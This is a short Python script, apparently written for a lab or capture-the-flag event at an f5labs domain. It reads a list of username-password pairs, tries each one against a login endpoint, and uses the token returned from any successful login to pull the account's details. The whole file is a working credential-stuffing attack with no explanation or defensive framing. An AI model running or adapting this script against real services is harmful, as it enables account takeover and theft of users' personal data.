import requests, json

with open('Download/credlist.txt', 'r') as file:
    lines = file.readlines()
    dict1 = []
    dict2 = []
    for line in lines:
        dict1.append(line.split('\t,')[0])
        dict2.append(line.split('\t,')[1].strip('\n'))
    creds = dict(zip(dict1, dict2))
    # print(creds)

API_ENDPOINT = "https://portal.f5labs.events/login"

for key, value in creds.items() :
    data = {"uname": key, 'pass': value}
    r = requests.post(url=API_ENDPOINT, data=json.dumps(data))
    if not 'status' in r.text:
        # print(r.json()['APIKEY'])
        API_DETAILS = "https://portal.f5labs.events/self/details/" + key
        header = r.json()
        t = requests.post(url=API_DETAILS, headers=header)
        print(t.json())
